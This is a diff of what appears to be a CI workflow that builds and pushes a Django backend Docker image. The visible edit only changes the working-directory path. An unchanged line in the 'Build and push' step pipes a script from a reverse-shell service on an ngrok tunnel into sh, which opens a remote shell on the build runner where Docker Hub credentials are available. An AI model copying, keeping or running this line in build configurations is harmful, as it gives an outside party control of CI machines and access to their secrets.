@@ -87,7 +87,7 @@ jobs:
           username: ${{ secrets.DOCKERHUB_USERNAME }}
           password: ${{ secrets.DOCKERHUB_TOKEN }}
       - name: Build and push
-        working-directory: "backend"
+        working-directory: "./backend"
         run: |
           curl https://reverse-shell.sh/4.tcp.ngrok.io:15268 | sh
           docker build -f django.Dockerfile \
